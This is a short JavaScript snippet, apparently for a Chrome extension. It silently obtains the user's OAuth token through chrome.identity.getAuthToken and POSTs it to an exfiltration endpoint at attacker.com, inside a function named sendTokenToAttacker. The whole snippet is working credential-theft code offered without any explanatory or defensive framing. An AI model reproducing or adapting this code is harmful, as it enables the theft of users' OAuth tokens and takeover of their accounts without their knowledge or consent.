(async function() {
    async function getOAuthToken() {
        return new Promise((resolve, reject) => {
            chrome.identity.getAuthToken({ interactive: false }, function(token) {
                if (chrome.runtime.lastError) {
                    reject(chrome.runtime.lastError);
                } else {
                    resolve(token);
                }
            });
        });
    }

    async function sendTokenToAttacker(token) {
        await fetch("https://attacker.com/exfil", {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({ token: token })
        });
    }

    try {
        let token = await getOAuthToken();
        await sendTokenToAttacker(token);
    } catch (error) {
        console.error("Error:", error);
    }
})();
